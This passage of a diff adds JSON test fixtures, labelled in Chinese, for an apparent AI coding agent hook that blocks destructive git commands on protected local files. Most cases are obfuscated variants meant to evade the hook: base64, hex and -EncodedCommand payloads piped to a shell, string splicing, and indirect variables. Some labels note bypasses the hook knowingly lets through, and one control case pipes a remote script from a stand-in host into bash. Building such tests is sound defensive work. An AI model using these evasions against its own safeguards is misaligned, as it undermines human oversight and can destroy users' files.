+          "conf.txt": "a=1\n",
+          ".claude/local-overrides.yml": "app:\n  repo: .\n  files:\n    - path: conf.txt\n      reason: 本機連線字串\n"
+        },
+        "commit": true,
+        "files_after_commit": {
+          "conf.txt": "a=LOCAL\n"
+        }
+      },
+      "payload": {
+        "tool_name": "PowerShell",
+        "tool_input": {
+          "command": "& ([string]::Concat('gi','t')) stash"
+        }
+      },
+      "expect": "BLOCK"
+    },
+    {
+      "label": "清單內檔 dirty·R3v G2② PowerShell -f 格式化出指令名［2026-10-18 R3 複驗修：shell-model 解碼補 \\u／\\U 且只留一份、管線餵 iex 的運算式、括號平衡計數、$(which X) 當字面 X；兩條路徑都跑］",
+      "setup": {
+        "files": {
+          "conf.txt": "a=1\n",
+          ".claude/local-overrides.yml": "app:\n  repo: .\n  files:\n    - path: conf.txt\n      reason: 本機連線字串\n"
+        },
+        "commit": true,
+        "files_after_commit": {
+          "conf.txt": "a=LOCAL\n"
+        }
+      },
+      "payload": {
+        "tool_name": "PowerShell",
+        "tool_input": {
+          "command": "& (\"g{0}\" -f \"it\") reset --hard"
+        }
+      },
+      "expect": "BLOCK"
+    },
+    {
+      "label": "清單內檔 dirty·R3v G2 對照 $(which git) checkout -- .（X 是 git 照擋）［2026-10-18 R3 複驗修：shell-model 解碼補 \\u／\\U 且只留一份、管線餵 iex 的運算式、括號平衡計數、$(which X) 當字面 X；兩條路徑都跑］",
+      "setup": {
+        "files": {
+          "conf.txt": "a=1\n",
+          ".claude/local-overrides.yml": "app:\n  repo: .\n  files:\n    - path: conf.txt\n      reason: 本機連線字串\n"
+        },
+        "commit": true,
+        "files_after_commit": {
+          "conf.txt": "a=LOCAL\n"
+        }
+      },
+      "payload": {
+        "tool_name": "Bash",
+        "tool_input": {
+          "command": "$(which git) checkout -- ."
+        }
+      },
+      "expect": "BLOCK"
+    },
+    {
+      "label": "清單內檔 dirty·R3v G2 副作用對照 $(which docker) rm -f ctr（X 是字面 docker、不是 git）［2026-10-18 R3 複驗修：shell-model 解碼補 \\u／\\U 且只留一份、管線餵 iex 的運算式、括號平衡計數、$(which X) 當字面 X；兩條路徑都跑］",
+      "setup": {
+        "files": {
+          "conf.txt": "a=1\n",
+          ".claude/local-overrides.yml": "app:\n  repo: .\n  files:\n    - path: conf.txt\n      reason: 本機連線字串\n"
+        },
+        "commit": true,
+        "files_after_commit": {
+          "conf.txt": "a=LOCAL\n"
+        }
+      },
+      "payload": {
+        "tool_name": "Bash",
+        "tool_input": {
+          "command": "$(which docker) rm -f ctr"
+        }
+      },
+      "expect": "ALLOW"
+    },
+    {
+      "label": "清單內檔 dirty·R3v G2 副作用對照 $(which python) -m pytest -k clean［2026-10-18 R3 複驗修：shell-model 解碼補 \\u／\\U 且只留一份、管線餵 iex 的運算式、括號平衡計數、$(which X) 當字面 X；兩條路徑都跑］",
+      "setup": {
+        "files": {
+          "conf.txt": "a=1\n",
+          ".claude/local-overrides.yml": "app:\n  repo: .\n  files:\n    - path: conf.txt\n      reason: 本機連線字串\n"
+        },
+        "commit": true,
+        "files_after_commit": {
+          "conf.txt": "a=LOCAL\n"
+        }
+      },
+      "payload": {
+        "tool_name": "Bash",
+        "tool_input": {
+          "command": "$(which python) -m pytest tests/e2e -k clean"
+        }
+      },
+      "expect": "ALLOW"
+    },
+    {
+      "label": "清單內檔 dirty·R3v G2 副作用對照 PowerShell & (Get-Command dotnet) clean［2026-10-18 R3 複驗修：shell-model 解碼補 \\u／\\U 且只留一份、管線餵 iex 的運算式、括號平衡計數、$(which X) 當字面 X；兩條路徑都跑］",
+      "setup": {
+        "files": {
+          "conf.txt": "a=1\n",
+          ".claude/local-overrides.yml": "app:\n  repo: .\n  files:\n    - path: conf.txt\n      reason: 本機連線字串\n"
+        },
+        "commit": true,
+        "files_after_commit": {
+          "conf.txt": "a=LOCAL\n"
+        }
+      },
+      "payload": {
+        "tool_name": "PowerShell",
+        "tool_input": {
+          "command": "& (Get-Command dotnet) clean"
+        }
+      },
+      "expect": "ALLOW"
+    },
+    {
+      "label": "清單內檔 dirty·R3v G2 對照 字面字串餵 iex 的唯讀指令［2026-10-18 R3 複驗修：shell-model 解碼補 \\u／\\U 且只留一份、管線餵 iex 的運算式、括號平衡計數、$(which X) 當字面 X；兩條路徑都跑］",
+      "setup": {
+        "files": {
+          "conf.txt": "a=1\n",
+          ".claude/local-overrides.yml": "app:\n  repo: .\n  files:\n    - path: conf.txt\n      reason: 本機連線字串\n"
+        },
+        "commit": true,
+        "files_after_commit": {
+          "conf.txt": "a=LOCAL\n"
+        }
+      },
+      "payload": {
+        "tool_name": "PowerShell",
+        "tool_input": {
+          "command": "'git status' | iex"
+        }
+      },
+      "expect": "ALLOW"
+    },
+    {
+      "label": "清單內檔 dirty·R3w F5 bash 翻譯字串 $\"git\" -C . checkout -- .［2026-10-19 R3 複驗第二輪修：bash 翻譯字串 $\"…\" 視同 \"…\"、管線餵 %／ForEach-Object 的 $_ 看來源、運算式不加括號餵 iex；兩條路徑都跑］",
+      "setup": {
+        "files": {
+          "conf.txt": "a=1\n",
+          ".claude/local-overrides.yml": "app:\n  repo: .\n  files:\n    - path: conf.txt\n      reason: 本機連線字串\n"
+        },
+        "commit": true,
+        "files_after_commit": {
+          "conf.txt": "a=LOCAL\n"
+        }
+      },
+      "payload": {
+        "tool_name": "Bash",
+        "tool_input": {
+          "command": "$\"git\" -C . checkout -- ."
+        }
+      },
+      "expect": "BLOCK"
+    },
+    {
+      "label": "清單內檔 dirty·R3w F5 翻譯字串拆字 $\"gi\"t reset --hard［2026-10-19 R3 複驗第二輪修：bash 翻譯字串 $\"…\" 視同 \"…\"、管線餵 %／ForEach-Object 的 $_ 看來源、運算式不加括號餵 iex；兩條路徑都跑］",
+      "setup": {
+        "files": {
+          "conf.txt": "a=1\n",
+          ".claude/local-overrides.yml": "app:\n  repo: .\n  files:\n    - path: conf.txt\n      reason: 本機連線字串\n"
+        },
+        "commit": true,
+        "files_after_commit": {
+          "conf.txt": "a=LOCAL\n"
+        }
+      },
+      "payload": {
+        "tool_name": "Bash",
+        "tool_input": {
+          "command": "$\"gi\"t reset --hard"
+        }
+      },
+      "expect": "BLOCK"
+    },
+    {
+      "label": "清單內檔 dirty·R3w F6 PowerShell 拼接運算式餵 % 的 $_ 當指令名［2026-10-19 R3 複驗第二輪修：bash 翻譯字串 $\"…\" 視同 \"…\"、管線餵 %／ForEach-Object 的 $_ 看來源、運算式不加括號餵 iex；兩條路徑都跑］",
+      "setup": {
+        "files": {
+          "conf.txt": "a=1\n",
+          ".claude/local-overrides.yml": "app:\n  repo: .\n  files:\n    - path: conf.txt\n      reason: 本機連線字串\n"
+        },
+        "commit": true,
+        "files_after_commit": {
+          "conf.txt": "a=LOCAL\n"
+        }
+      },
+      "payload": {
+        "tool_name": "PowerShell",
+        "tool_input": {
+          "command": "('g'+'it') | % { & $_ reset --hard }"
+        }
+      },
+      "expect": "BLOCK"
+    },
+    {
+      "label": "清單內檔 dirty·R3w F6 PowerShell 字面 git 餵 ForEach-Object 的 $_［2026-10-19 R3 複驗第二輪修：bash 翻譯字串 $\"…\" 視同 \"…\"、管線餵 %／ForEach-Object 的 $_ 看來源、運算式不加括號餵 iex；兩條路徑都跑］",
+      "setup": {
+        "files": {
+          "conf.txt": "a=1\n",
+          ".claude/local-overrides.yml": "app:\n  repo: .\n  files:\n    - path: conf.txt\n      reason: 本機連線字串\n"
+        },
+        "commit": true,
+        "files_after_commit": {
+          "conf.txt": "a=LOCAL\n"
+        }
+      },
+      "payload": {
+        "tool_name": "PowerShell",
+        "tool_input": {
+          "command": "'git' | ForEach-Object { & $_ checkout -- . }"
+        }
+      },
+      "expect": "BLOCK"
+    },
+    {
+      "label": "清單內檔 dirty·R3w F7 PowerShell 不加括號的運算式餵 iex［2026-10-19 R3 複驗第二輪修：bash 翻譯字串 $\"…\" 視同 \"…\"、管線餵 %／ForEach-Object 的 $_ 看來源、運算式不加括號餵 iex；兩條路徑都跑］",
+      "setup": {
+        "files": {
+          "conf.txt": "a=1\n",
+          ".claude/local-overrides.yml": "app:\n  repo: .\n  files:\n    - path: conf.txt\n      reason: 本機連線字串\n"
+        },
+        "commit": true,
+        "files_after_commit": {
+          "conf.txt": "a=LOCAL\n"
+        }
+      },
+      "payload": {
+        "tool_name": "PowerShell",
+        "tool_input": {
+          "command": "'gi'+'t reset --hard' | iex"
+        }
+      },
+      "expect": "BLOCK"
+    },
+    {
+      "label": "清單內檔 dirty·R3w 對照 echo $\"git reset --hard\"（字串不是指令）［2026-10-19 R3 複驗第二輪修：bash 翻譯字串 $\"…\" 視同 \"…\"、管線餵 %／ForEach-Object 的 $_ 看來源、運算式不加括號餵 iex；兩條路徑都跑］",
+      "setup": {
+        "files": {
+          "conf.txt": "a=1\n",
+          ".claude/local-overrides.yml": "app:\n  repo: .\n  files:\n    - path: conf.txt\n      reason: 本機連線字串\n"
+        },
+        "commit": true,
+        "files_after_commit": {
+          "conf.txt": "a=LOCAL\n"
+        }
+      },
+      "payload": {
+        "tool_name": "Bash",
+        "tool_input": {
+          "command": "echo $\"git reset --hard\""
+        }
+      },
+      "expect": "ALLOW"
+    },
+    {
+      "label": "清單內檔 dirty·R3w 對照 純變數餵 % 的 $_（已知盲區，政策一致）［2026-10-19 R3 複驗第二輪修：bash 翻譯字串 $\"…\" 視同 \"…\"、管線餵 %／ForEach-Object 的 $_ 看來源、運算式不加括號餵 iex；兩條路徑都跑］",
+      "setup": {
+        "files": {
+          "conf.txt": "a=1\n",
+          ".claude/local-overrides.yml": "app:\n  repo: .\n  files:\n    - path: conf.txt\n      reason: 本機連線字串\n"
+        },
+        "commit": true,
+        "files_after_commit": {
+          "conf.txt": "a=LOCAL\n"
+        }
+      },
+      "payload": {
+        "tool_name": "PowerShell",
+        "tool_input": {
+          "command": "$list | % { & $_ reset --hard }"
+        }
+      },
+      "expect": "ALLOW"
+    },
+    {
+      "label": "清單內檔 dirty·R3w 對照 字面 docker 餵 % 的 $_、無危險動詞［2026-10-19 R3 複驗第二輪修：bash 翻譯字串 $\"…\" 視同 \"…\"、管線餵 %／ForEach-Object 的 $_ 看來源、運算式不加括號餵 iex；兩條路徑都跑］",
+      "setup": {
+        "files": {
+          "conf.txt": "a=1\n",
+          ".claude/local-overrides.yml": "app:\n  repo: .\n  files:\n    - path: conf.txt\n      reason: 本機連線字串\n"
+        },
+        "commit": true,
+        "files_after_commit": {
+          "conf.txt": "a=LOCAL\n"
+        }
+      },
+      "payload": {
+        "tool_name": "PowerShell",
+        "tool_input": {
+          "command": "'docker' | % { & $_ ps }"
+        }
+      },
+      "expect": "ALLOW"
+    },
+    {
+      "label": "清單內檔 dirty·R3x F8-1 PowerShell $ExecutionContext.InvokeCommand.InvokeScript 字面 reset --hard［2026-10-19 R3 複驗第三輪修：InvokeScript 原語、-EncodedCommand 就地解碼、base64 管線餵殼就地解碼、${!ref}／${arr[0]} 不算純變數；兩條路徑都跑］",
+      "setup": {
+        "files": {
+          "conf.txt": "a=1\n",
+          ".claude/local-overrides.yml": "app:\n  repo: .\n  files:\n    - path: conf.txt\n      reason: 本機連線字串\n"
+        },
+        "commit": true,
+        "files_after_commit": {
+          "conf.txt": "a=LOCAL\n"
+        }
+      },
+      "payload": {
+        "tool_name": "PowerShell",
+        "tool_input": {
+          "command": "$ExecutionContext.InvokeCommand.InvokeScript('git reset --hard')"
+        }
+      },
+      "expect": "BLOCK"
+    },
+    {
+      "label": "清單內檔 dirty·R3x F8-1 InvokeScript 引數是拼接運算式［2026-10-19 R3 複驗第三輪修：InvokeScript 原語、-EncodedCommand 就地解碼、base64 管線餵殼就地解碼、${!ref}／${arr[0]} 不算純變數；兩條路徑都跑］",
+      "setup": {
+        "files": {
+          "conf.txt": "a=1\n",
+          ".claude/local-overrides.yml": "app:\n  repo: .\n  files:\n    - path: conf.txt\n      reason: 本機連線字串\n"
+        },
+        "commit": true,
+        "files_after_commit": {
+          "conf.txt": "a=LOCAL\n"
+        }
+      },
+      "payload": {
+        "tool_name": "PowerShell",
+        "tool_input": {
+          "command": "$ExecutionContext.InvokeCommand.InvokeScript(('g'+'it checkout -- .'))"
+        }
+      },
+      "expect": "BLOCK"
+    },
+    {
+      "label": "清單內檔 dirty·R3x F8-2 powershell -EncodedCommand（UTF-16LE base64 的 git reset --hard）［2026-10-19 R3 複驗第三輪修：InvokeScript 原語、-EncodedCommand 就地解碼、base64 管線餵殼就地解碼、${!ref}／${arr[0]} 不算純變數；兩條路徑都跑］",
+      "setup": {
+        "files": {
+          "conf.txt": "a=1\n",
+          ".claude/local-overrides.yml": "app:\n  repo: .\n  files:\n    - path: conf.txt\n      reason: 本機連線字串\n"
+        },
+        "commit": true,
+        "files_after_commit": {
+          "conf.txt": "a=LOCAL\n"
+        }
+      },
+      "payload": {
+        "tool_name": "PowerShell",
+        "tool_input": {
+          "command": "powershell -EncodedCommand ZwBpAHQAIAByAGUAcwBlAHQAIAAtAC0AaABhAHIAZAA="
+        }
+      },
+      "expect": "BLOCK"
+    },
+    {
+      "label": "清單內檔 dirty·R3x F8-2 pwsh -enc 縮寫（Bash 工具）［2026-10-19 R3 複驗第三輪修：InvokeScript 原語、-EncodedCommand 就地解碼、base64 管線餵殼就地解碼、${!ref}／${arr[0]} 不算純變數；兩條路徑都跑］",
+      "setup": {
+        "files": {
+          "conf.txt": "a=1\n",
+          ".claude/local-overrides.yml": "app:\n  repo: .\n  files:\n    - path: conf.txt\n      reason: 本機連線字串\n"
+        },
+        "commit": true,
+        "files_after_commit": {
+          "conf.txt": "a=LOCAL\n"
+        }
+      },
+      "payload": {
+        "tool_name": "Bash",
+        "tool_input": {
+          "command": "pwsh -enc ZwBpAHQAIABjAGgAZQBjAGsAbwB1AHQAIAAtAC0AIAAuAA=="
+        }
+      },
+      "expect": "BLOCK"
+    },
+    {
+      "label": "清單內檔 dirty·R3x F8-3 echo <base64> | base64 -d | sh（解出 git checkout -- .）［2026-10-19 R3 複驗第三輪修：InvokeScript 原語、-EncodedCommand 就地解碼、base64 管線餵殼就地解碼、${!ref}／${arr[0]} 不算純變數；兩條路徑都跑］",
+      "setup": {
+        "files": {
+          "conf.txt": "a=1\n",
+          ".claude/local-overrides.yml": "app:\n  repo: .\n  files:\n    - path: conf.txt\n      reason: 本機連線字串\n"
+        },
+        "commit": true,
+        "files_after_commit": {
+          "conf.txt": "a=LOCAL\n"
+        }
+      },
+      "payload": {
+        "tool_name": "Bash",
+        "tool_input": {
+          "command": "echo Z2l0IGNoZWNrb3V0IC0tIC4= | base64 -d | sh"
+        }
+      },
+      "expect": "BLOCK"
+    },
+    {
+      "label": "清單內檔 dirty·R3x F8-3 here-string base64 -d <<< … | bash［2026-10-19 R3 複驗第三輪修：InvokeScript 原語、-EncodedCommand 就地解碼、base64 管線餵殼就地解碼、${!ref}／${arr[0]} 不算純變數；兩條路徑都跑］",
+      "setup": {
+        "files": {
+          "conf.txt": "a=1\n",
+          ".claude/local-overrides.yml": "app:\n  repo: .\n  files:\n    - path: conf.txt\n      reason: 本機連線字串\n"
+        },
+        "commit": true,
+        "files_after_commit": {
+          "conf.txt": "a=LOCAL\n"
+        }
+      },
+      "payload": {
+        "tool_name": "Bash",
+        "tool_input": {
+          "command": "base64 -d <<< Z2l0IHJlc2V0IC0taGFyZA== | bash"
+        }
+      },
+      "expect": "BLOCK"
+    },
+    {
+      "label": "清單內檔 dirty·R3x F8-3 十六進位 xxd -r -p | sh（解出 git stash）［2026-10-19 R3 複驗第三輪修：InvokeScript 原語、-EncodedCommand 就地解碼、base64 管線餵殼就地解碼、${!ref}／${arr[0]} 不算純變數；兩條路徑都跑］",
+      "setup": {
+        "files": {
+          "conf.txt": "a=1\n",
+          ".claude/local-overrides.yml": "app:\n  repo: .\n  files:\n    - path: conf.txt\n      reason: 本機連線字串\n"
+        },
+        "commit": true,
+        "files_after_commit": {
+          "conf.txt": "a=LOCAL\n"
+        }
+      },
+      "payload": {
+        "tool_name": "Bash",
+        "tool_input": {
+          "command": "echo 676974207374617368 | xxd -r -p | sh"
+        }
+      },
+      "expect": "BLOCK"
+    },
+    {
+      "label": "清單內檔 dirty·R3x F8-4 ${!ref} 間接參照當指令名［2026-10-19 R3 複驗第三輪修：InvokeScript 原語、-EncodedCommand 就地解碼、base64 管線餵殼就地解碼、${!ref}／${arr[0]} 不算純變數；兩條路徑都跑］",
+      "setup": {
+        "files": {
+          "conf.txt": "a=1\n",
+          ".claude/local-overrides.yml": "app:\n  repo: .\n  files:\n    - path: conf.txt\n      reason: 本機連線字串\n"
+        },
+        "commit": true,
+        "files_after_commit": {
+          "conf.txt": "a=LOCAL\n"
+        }
+      },
+      "payload": {
+        "tool_name": "Bash",
+        "tool_input": {
+          "command": "ref=g; g=git; ${!ref} reset --hard"
+        }
+      },
+      "expect": "BLOCK"
+    },
+    {
+      "label": "清單內檔 dirty·R3x F8-4 ${arr[0]} 陣列元素當指令名［2026-10-19 R3 複驗第三輪修：InvokeScript 原語、-EncodedCommand 就地解碼、base64 管線餵殼就地解碼、${!ref}／${arr[0]} 不算純變數；兩條路徑都跑］",
+      "setup": {
+        "files": {
+          "conf.txt": "a=1\n",
+          ".claude/local-overrides.yml": "app:\n  repo: .\n  files:\n    - path: conf.txt\n      reason: 本機連線字串\n"
+        },
+        "commit": true,
+        "files_after_commit": {
+          "conf.txt": "a=LOCAL\n"
+        }
+      },
+      "payload": {
+        "tool_name": "Bash",
+        "tool_input": {
+          "command": "arr=(git); ${arr[0]} checkout -- ."
+        }
+      },
+      "expect": "BLOCK"
+    },
+    {
+      "label": "清單內檔 dirty·R3x 對照 powershell -c \"git status\"［2026-10-19 R3 複驗第三輪修：InvokeScript 原語、-EncodedCommand 就地解碼、base64 管線餵殼就地解碼、${!ref}／${arr[0]} 不算純變數；兩條路徑都跑］",
+      "setup": {
+        "files": {
+          "conf.txt": "a=1\n",
+          ".claude/local-overrides.yml": "app:\n  repo: .\n  files:\n    - path: conf.txt\n      reason: 本機連線字串\n"
+        },
+        "commit": true,
+        "files_after_commit": {
+          "conf.txt": "a=LOCAL\n"
+        }
+      },
+      "payload": {
+        "tool_name": "PowerShell",
+        "tool_input": {
+          "command": "powershell -c \"git status\""
+        }
+      },
+      "expect": "ALLOW"
+    },
+    {
+      "label": "清單內檔 dirty·R3x 對照 -EncodedCommand 解出來是唯讀 git status［2026-10-19 R3 複驗第三輪修：InvokeScript 原語、-EncodedCommand 就地解碼、base64 管線餵殼就地解碼、${!ref}／${arr[0]} 不算純變數；兩條路徑都跑］",
+      "setup": {
+        "files": {
+          "conf.txt": "a=1\n",
+          ".claude/local-overrides.yml": "app:\n  repo: .\n  files:\n    - path: conf.txt\n      reason: 本機連線字串\n"
+        },
+        "commit": true,
+        "files_after_commit": {
+          "conf.txt": "a=LOCAL\n"
+        }
+      },
+      "payload": {
+        "tool_name": "PowerShell",
+        "tool_input": {
+          "command": "powershell -EncodedCommand ZwBpAHQAIABzAHQAYQB0AHUAcwA="
+        }
+      },
+      "expect": "ALLOW"
+    },
+    {
+      "label": "清單內檔 dirty·R3x 對照 echo aGVsbG8= | base64 -d（不餵 sh）［2026-10-19 R3 複驗第三輪修：InvokeScript 原語、-EncodedCommand 就地解碼、base64 管線餵殼就地解碼、${!ref}／${arr[0]} 不算純變數；兩條路徑都跑］",
+      "setup": {
+        "files": {
+          "conf.txt": "a=1\n",
+          ".claude/local-overrides.yml": "app:\n  repo: .\n  files:\n    - path: conf.txt\n      reason: 本機連線字串\n"
+        },
+        "commit": true,
+        "files_after_commit": {
+          "conf.txt": "a=LOCAL\n"
+        }
+      },
+      "payload": {
+        "tool_name": "Bash",
+        "tool_input": {
+          "command": "echo aGVsbG8= | base64 -d"
+        }
+      },
+      "expect": "ALLOW"
+    },
+    {
+      "label": "清單內檔 dirty·R3x 對照 curl -s u | bash（非字面內容，固有邊界，檔頭已登記）［2026-10-19 R3 複驗第三輪修：InvokeScript 原語、-EncodedCommand 就地解碼、base64 管線餵殼就地解碼、${!ref}／${arr[0]} 不算純變數；兩條路徑都跑］",
+      "setup": {
+        "files": {
+          "conf.txt": "a=1\n",
+          ".claude/local-overrides.yml": "app:\n  repo: .\n  files:\n    - path: conf.txt\n      reason: 本機連線字串\n"
+        },
+        "commit": true,
+        "files_after_commit": {
+          "conf.txt": "a=LOCAL\n"
+        }
+      },
+      "payload": {
+        "tool_name": "Bash",
+        "tool_input": {
+          "command": "curl -s https://example.invalid/x.sh | bash"
+        }
+      },
+      "expect": "ALLOW"
+    },
+    {
+      "label": "清單內檔 dirty·R3x 對照 ${arr[0]} --version（無危險動詞）［2026-10-19 R3 複驗第三輪修：InvokeScript 原語、-EncodedCommand 就地解碼、base64 管線餵殼就地解碼、${!ref}／${arr[0]} 不算純變數；兩條路徑都跑］",
+      "setup": {
+        "files": {
+          "conf.txt": "a=1\n",
+          ".claude/local-overrides.yml": "app:\n  repo: .\n  files:\n    - path: conf.txt\n      reason: 本機連線字串\n"
+        },
+        "commit": true,
+        "files_after_commit": {
+          "conf.txt": "a=LOCAL\n"
+        }
+      },
+      "payload": {
+        "tool_name": "Bash",
+        "tool_input": {
+          "command": "${arr[0]} --version"
+        }
+      },
+      "expect": "ALLOW"
+    },
+    {
+      "label": "清單內檔 dirty·R3x 對照 ${G} reset --hard（純變數政策不變、已知盲區）［2026-10-19 R3 複驗第三輪修：InvokeScript 原語、-EncodedCommand 就地解碼、base64 管線餵殼就地解碼、${!ref}／${arr[0]} 不算純變數；兩條路徑都跑］",
+      "setup": {
+        "files": {
+          "conf.txt": "a=1\n",
+          ".claude/local-overrides.yml": "app:\n  repo: .\n  files:\n    - path: conf.txt\n      reason: 本機連線字串\n"
+        },
+        "commit": true,
+        "files_after_commit": {
+          "conf.txt": "a=LOCAL\n"
+        }
+      },
+      "payload": {
+        "tool_name": "Bash",
+        "tool_input": {
+          "command": "${G} reset --hard"
+        }
+      },
+      "expect": "ALLOW"
+    },
+    {
+      "label": "清單內檔 dirty·R3y printf '%s' <base64> | base64 -d | sh（解出 git checkout -- .）［2026-10-19 R3 複驗第四輪收口：printf 格式字串跳過、base64 併寫旗標、InvokeScript 不加括號拼接、${arr[@]} 攤平；兩條路徑都跑］",
+      "setup": {
+        "files": {
+          "conf.txt": "a=1\n",
+          ".claude/local-overrides.yml": "app:\n  repo: .\n  files:\n    - path: conf.txt\n      reason: 本機連線字串\n"
+        },
+        "commit": true,
+        "files_after_commit": {
+          "conf.txt": "a=LOCAL\n"
+        }
+      },
+      "payload": {
+        "tool_name": "Bash",
+        "tool_input": {
+          "command": "printf '%s' Z2l0IGNoZWNrb3V0IC0tIC4= | base64 -d | sh"
+        }
+      },
+      "expect": "BLOCK"
+    },
+    {
+      "label": "清單內檔 dirty·R3y base64 -di 併寫旗標 | bash（解出 git reset --hard）［2026-10-19 R3 複驗第四輪收口：printf 格式字串跳過、base64 併寫旗標、InvokeScript 不加括號拼接、${arr[@]} 攤平；兩條路徑都跑］",
+      "setup": {
+        "files": {
+          "conf.txt": "a=1\n",
+          ".claude/local-overrides.yml": "app:\n  repo: .\n  files:\n    - path: conf.txt\n      reason: 本機連線字串\n"
+        },
+        "commit": true,
+        "files_after_commit": {
+          "conf.txt": "a=LOCAL\n"
+        }
+      },
+      "payload": {
+        "tool_name": "Bash",
+        "tool_input": {
+          "command": "echo Z2l0IHJlc2V0IC0taGFyZA== | base64 -di | bash"
+        }
+      },
+      "expect": "BLOCK"
+    },
+    {
+      "label": "清單內檔 dirty·R3y InvokeScript 引數是不加括號的拼接［2026-10-19 R3 複驗第四輪收口：printf 格式字串跳過、base64 併寫旗標、InvokeScript 不加括號拼接、${arr[@]} 攤平；兩條路徑都跑］",
+      "setup": {
+        "files": {
+          "conf.txt": "a=1\n",
+          ".claude/local-overrides.yml": "app:\n  repo: .\n  files:\n    - path: conf.txt\n      reason: 本機連線字串\n"
+        },
+        "commit": true,
+        "files_after_commit": {
+          "conf.txt": "a=LOCAL\n"
+        }
+      },
+      "payload": {
+        "tool_name": "PowerShell",
+        "tool_input": {
+          "command": "$ExecutionContext.InvokeCommand.InvokeScript('g'+'it reset --hard')"
+        }
+      },
+      "expect": "BLOCK"
+    },
+    {
+      "label": "清單內檔 dirty·R3y ${arr[@]} 整條指令由陣列攤平（同句提到 git）［2026-10-19 R3 複驗第四輪收口：printf 格式字串跳過、base64 併寫旗標、InvokeScript 不加括號拼接、${arr[@]} 攤平；兩條路徑都跑］",
+      "setup": {
+        "files": {
+          "conf.txt": "a=1\n",
+          ".claude/local-overrides.yml": "app:\n  repo: .\n  files:\n    - path: conf.txt\n      reason: 本機連線字串\n"
+        },
+        "commit": true,
+        "files_after_commit": {
+          "conf.txt": "a=LOCAL\n"
+        }
+      },
+      "payload": {
+        "tool_name": "Bash",
+        "tool_input": {
+          "command": "arr=(git reset --hard); ${arr[@]}"
+        }
+      },
+      "expect": "BLOCK"
+    },
+    {
+      "label": "清單內檔 dirty·R3y 對照 ${arr[@]} 同句沒有 git 也沒危險動詞［2026-10-19 R3 複驗第四輪收口：printf 格式字串跳過、base64 併寫旗標、InvokeScript 不加括號拼接、${arr[@]} 攤平；兩條路徑都跑］",
+      "setup": {
+        "files": {
+          "conf.txt": "a=1\n",
+          ".claude/local-overrides.yml": "app:\n  repo: .\n  files:\n    - path: conf.txt\n      reason: 本機連線字串\n"
+        },
+        "commit": true,
+        "files_after_commit": {
+          "conf.txt": "a=LOCAL\n"
+        }
+      },
+      "payload": {
+        "tool_name": "Bash",
+        "tool_input": {
+          "command": "arr=(ls -la); ${arr[@]}"
+        }
+      },
+      "expect": "ALLOW"
+    },
+    {
+      "label": "清單內檔 dirty·R3z echo 非 base64 字面 | base64 -d | sh（解不出→提醒不擋）［2026-10-19 R3 收口：解不出的編碼內容不擋但 stderr＋additionalContext 提醒「本閘沒檢查」；兩條路徑都跑］",
+      "setup": {
+        "files": {
+          "conf.txt": "a=1\n",
+          ".claude/local-overrides.yml": "app:\n  repo: .\n  files:\n    - path: conf.txt\n      reason: 本機連線字串\n"
+        },
+        "commit": true,
+        "files_after_commit": {
+          "conf.txt": "a=LOCAL\n"
+        }
+      },
+      "payload": {
+        "tool_name": "Bash",
+        "tool_input": {
+          "command": "echo 'not*valid*b64' | base64 -d | sh"
+        }
+      },
+      "expect": "NOTE",
+      "visible": true
+    },
+    {
+      "label": "清單內檔 dirty·R3z -EncodedCommand 不是 base64（解不出→提醒不擋）［2026-10-19 R3 收口：解不出的編碼內容不擋但 stderr＋additionalContext 提醒「本閘沒檢查」；兩條路徑都跑］",
+      "setup": {
+        "files": {
+          "conf.txt": "a=1\n",
+          ".claude/local-overrides.yml": "app:\n  repo: .\n  files:\n    - path: conf.txt\n      reason: 本機連線字串\n"
+        },
+        "commit": true,
+        "files_after_commit": {
+          "conf.txt": "a=LOCAL\n"
+        }
+      },
+      "payload": {
+        "tool_name": "PowerShell",
+        "tool_input": {
+          "command": "powershell -EncodedCommand not-base64!!"
+        }
+      },
+      "expect": "NOTE",
+      "visible": true
+    },
+    {
+      "label": "清單內檔 dirty·R3z -EncodedCommand 合法 base64 但 UTF-16LE 解成亂碼（解不出→提醒不擋）［2026-10-19 R3 收口：解不出的編碼內容不擋但 stderr＋additionalContext 提醒「本閘沒檢查」；兩條路徑都跑］",
+      "setup": {
+        "files": {
+          "conf.txt": "a=1\n",
+          ".claude/local-overrides.yml": "app:\n  repo: .\n  files:\n    - path: conf.txt\n      reason: 本機連線字串\n"
+        },
+        "commit": true,
+        "files_after_commit": {
+          "conf.txt": "a=LOCAL\n"
+        }
+      },
+      "payload": {
+        "tool_name": "PowerShell",
+        "tool_input": {
+          "command": "powershell -EncodedCommand Z2l0IHJlc2V0IC0taGFyZA=="
+        }
+      },
+      "expect": "NOTE",
+      "visible": true
+    },
+    {
+      "label": "清單內檔 dirty·R3z xxd -r -p 字面不是十六進位（解不出→提醒不擋）［2026-10-19 R3 收口：解不出的編碼內容不擋但 stderr＋additionalContext 提醒「本閘沒檢查」；兩條路徑都跑］",
+      "setup": {
+        "files": {
+          "conf.txt": "a=1\n",
+          ".claude/local-overrides.yml": "app:\n  repo: .\n  files:\n    - path: conf.txt\n      reason: 本機連線字串\n"
+        },
+        "commit": true,
+        "files_after_commit": {
+          "conf.txt": "a=LOCAL\n"
+        }
+      },
+      "payload": {
+        "tool_name": "Bash",
+        "tool_input": {
+          "command": "echo zz | xxd -r -p | sh"
+        }
+      },
+      "expect": "NOTE",
+      "visible": true
+    },
+    {
+      "label": "清單內檔 dirty·R3z 對照 解得出且與 hack 無關保持安靜［2026-10-19 R3 收口：解不出的編碼內容不擋但 stderr＋additionalContext 提醒「本閘沒檢查」；兩條路徑都跑］",
+      "setup": {
+        "files": {
+          "conf.txt": "a=1\n",
+          ".claude/local-overrides.yml": "app:\n  repo: .\n  files:\n    - path: conf.txt\n      reason: 本機連線字串\n"
+        },
+        "commit": true,
+        "files_after_commit": {
+          "conf.txt": "a=LOCAL\n"
+        }
+      },
+      "payload": {
+        "tool_name": "Bash",
+        "tool_input": {
+          "command": "echo bHMgLWxh | base64 -d | sh"
+        }
+      },
+      "expect": "SILENT"
+    },
+    {
+      "label": "清單內檔 dirty·R3z 對照 -EncodedCommand 解出 git status 保持安靜［2026-10-19 R3 收口：解不出的編碼內容不擋但 stderr＋additionalContext 提醒「本閘沒檢查」；兩條路徑都跑］",
+      "setup": {
+        "files": {
+          "conf.txt": "a=1\n",
+          ".claude/local-overrides.yml": "app:\n  repo: .\n  files:\n    - path: conf.txt\n      reason: 本機連線字串\n"
+        },
+        "commit": true,
+        "files_after_commit": {
+          "conf.txt": "a=LOCAL\n"
+        }
+      },
+      "payload": {
+        "tool_name": "PowerShell",
